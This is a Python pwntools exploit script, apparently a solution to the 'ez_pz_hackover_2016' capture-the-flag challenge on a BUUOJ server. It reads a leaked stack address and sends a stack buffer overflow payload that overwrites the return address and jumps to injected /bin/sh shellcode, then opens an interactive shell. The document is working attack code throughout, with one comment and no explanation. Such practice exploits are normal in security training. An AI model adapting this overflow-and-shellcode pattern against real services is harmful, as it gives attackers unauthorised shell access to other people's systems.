from pwn import *
from LibcSearcher import *

context.arch = 'i386'
context.log_level = 'debug'

elf = ELF('../ez_pz_hackover_2016')
libc = ELF('../libc-2.23.so')

target = remote('node4.buuoj.cn', 25389)
# target = process('../ez_pz_hackover_2016')

shellcode = asm(shellcraft.sh())
target.recvuntil('crash: ')
buf_addr = int(target.recv(10), 16) - 28

print('[+] Stack address: {}'.format(hex(buf_addr)))
target.recvuntil('> ')

print(len(shellcode))

# The decompilation result of IDA Pro is incorrect...
payload = (b'crashme' + b'\x00').ljust(26, b'a') + p32(buf_addr) + shellcode
target.sendline(payload)
target.interactive()